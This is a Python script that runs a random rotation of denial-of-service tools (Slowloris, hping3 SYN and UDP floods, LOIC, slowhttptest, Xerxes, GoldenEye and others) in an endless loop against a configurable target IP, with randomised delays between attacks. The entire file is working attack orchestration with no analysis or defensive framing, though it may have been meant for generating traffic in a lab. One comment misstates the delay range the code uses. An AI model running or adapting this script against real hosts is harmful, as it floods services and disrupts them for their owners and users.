import os
import time
import random
from datetime import datetime

# Function to run Slowloris DoS attack
def run_slowloris(target_ip):
    slowloris_cmd = f"slowloris {target_ip}"
    print(f"Running Slowloris attack on {target_ip}...")
    os.system(slowloris_cmd)
    time.sleep(random.randint(5, 10))

# Function to run Hping3 (TCP SYN flood)
def run_hping3(target_ip):
    hping3_cmd = f"hping3 --flood -S {target_ip} -p 80"
    print(f"Running Hping3 (SYN flood) on {target_ip}...")
    os.system(hping3_cmd)
    time.sleep(random.randint(5, 10))

# Function to run SYN flood attack using Hping3
def run_synflood(target_ip):
    synflood_cmd = f"hping3 -i u40 -S -p 80 -c 100000 {target_ip}"
    print(f"Running SYN Flood on {target_ip}...")
    os.system(synflood_cmd)
    time.sleep(random.randint(5, 10))

# Function to run LOIC (Low Orbit Ion Cannon) attack
def run_loic(target_ip):
    loic_cmd = f"loic {target_ip} -p 80"
    print(f"Running LOIC attack on {target_ip}...")
    os.system(loic_cmd)
    time.sleep(random.randint(5, 10))

# Function to run Slowhttptest (Slow HTTP DoS)
def run_slowhttptest(target_ip):
    slowhttptest_cmd = f"slowhttptest -c 100 -i 10 -r 200 -t GET -p 80 -H {target_ip}"
    print(f"Running Slowhttptest attack on {target_ip}...")
    os.system(slowhttptest_cmd)
    time.sleep(random.randint(5, 10))

# Function to run UDP flood attack using Hping3
def run_udpflood(target_ip):
    udpflood_cmd = f"hping3 --flood --udp {target_ip} -p 53"
    print(f"Running UDP flood on {target_ip}...")
    os.system(udpflood_cmd)
    time.sleep(random.randint(5, 10))

# Function to run Xerxes (HTTP DoS attack)
def run_xerxes(target_ip):
    xerxes_cmd = f"./xerxes {target_ip} 80"
    print(f"Running Xerxes DoS attack on {target_ip}...")
    os.system(xerxes_cmd)
    time.sleep(random.randint(5, 10))

# Function to run GoldenEye (HTTP DoS attack)
def run_goldeneye(target_ip):
    goldeneye_cmd = f"python3 goldeneye.py {target_ip} 80"
    print(f"Running GoldenEye DoS attack on {target_ip}...")
    os.system(goldeneye_cmd)
    time.sleep(random.randint(5, 10))

# Function to run DDoS-Game (Python-based DDoS simulation)
def run_ddos_game(target_ip):
    ddos_game_cmd = f"python3 ddos_game.py {target_ip} 80"
    print(f"Running DDoS-Game attack on {target_ip}...")
    os.system(ddos_game_cmd)
    time.sleep(random.randint(5, 10))

# Function to run T50 (HTTP DoS tool)
def run_t50(target_ip):
    t50_cmd = f"python3 t50.py {target_ip}"
    print(f"Running T50 DoS attack on {target_ip}...")
    os.system(t50_cmd)
    time.sleep(random.randint(5, 10))

# Main function to run DDoS/DoS attacks at random intervals
def main():
    target_ip = "192.168.1.102"  # Replace with your target IP

    # Run DDoS/DoS attacks in an infinite loop with random intervals
    print(f"Running DoS/DDoS attacks on {target_ip}...")

    attacks = [
        run_slowloris,
        run_hping3,
        run_synflood,
        run_loic,
        run_slowhttptest,
        run_udpflood,
        run_xerxes,
        run_goldeneye,
        run_ddos_game,
        run_t50
    ]

    while True:
        # Randomly select an attack to run
        attack = random.choice(attacks)

        # Run the selected attack
        attack(target_ip)

        # Random delay between 10 to 30 minutes (600 to 1800 seconds)
        random_delay = random.randint(120, 360)
        print(f"Waiting for {random_delay} seconds before running another attack...")
        time.sleep(random_delay)

if __name__ == "__main__":
    main()
